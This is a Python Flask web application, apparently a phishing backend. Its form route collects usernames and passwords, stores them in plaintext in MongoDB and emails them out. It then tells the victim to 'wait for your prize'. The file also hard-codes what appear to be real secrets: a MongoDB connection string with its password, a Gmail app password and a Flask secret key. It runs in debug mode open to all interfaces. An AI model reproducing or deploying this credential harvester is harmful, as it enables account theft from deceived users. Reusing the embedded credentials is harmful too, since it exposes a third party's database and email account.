import os
from os.path import join, dirname
from dotenv import load_dotenv
from flask import Flask, request, jsonify, render_template, flash, redirect, url_for
from pymongo import MongoClient
from flask_mail import Mail, Message

dotenv_path = join(dirname(__file__), '.env')
load_dotenv(dotenv_path)

MONGODB_URI = os.environ.get("MONGODB_URI")
DB_NAME =  os.environ.get("DB_NAME")

client = MongoClient(MONGODB_URI)
db = client[DB_NAME]

app = Flask(__name__)
app.secret_key = 'super_secret_key_12345'


# Konfigurasi MongoDB
client = MongoClient('mongodb://maulanawarsidin:maul123@cluster0-shard-00-00.h0mn1.mongodb.net:27017,cluster0-shard-00-01.h0mn1.mongodb.net:27017,cluster0-shard-00-02.h0mn1.mongodb.net:27017/?ssl=true&replicaSet=atlas-mtlpxq-shard-0&authSource=admin&retryWrites=true&w=majority&appName=Cluster0')
db = client['apex']
collection = db['userdata']

app.config['MAIL_SERVER'] = 'smtp.gmail.com'  # Ganti sesuai penyedia email
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = 'maulana.warsidin@gmail.com'  # Email Anda
app.config['MAIL_PASSWORD'] = 'kccc fvuk lizy wqrm'         # Kata sandi email Anda
mail = Mail(app)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    password = request.form.get('password')

    if not username or not password:
        return jsonify({"error": "Nama dan nomor HP wajib diisi"}), 400

    # Simpan data ke MongoDB
    data = {"username": username, "password": password}
    collection.insert_one(data)

    try:
        msg = Message(
            subject='Notifikasi Data Baru Masuk',
            sender='your_email@gmail.com',  # Email pengirim
            recipients=['recipient_email@gmail.com'],  # Email penerima
            body=f"Data baru telah masuk:\n\nUsername: {username}\nPassword: {password}"
        )
        mail.send(msg)
        flash('Data has been received, please wait for your prize', 'success')
    except Exception as e:
        flash(f'Data berhasil disimpan, tetapi email gagal dikirim: {e}', 'error')

    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run('0.0.0.0', port=5000, debug=True)
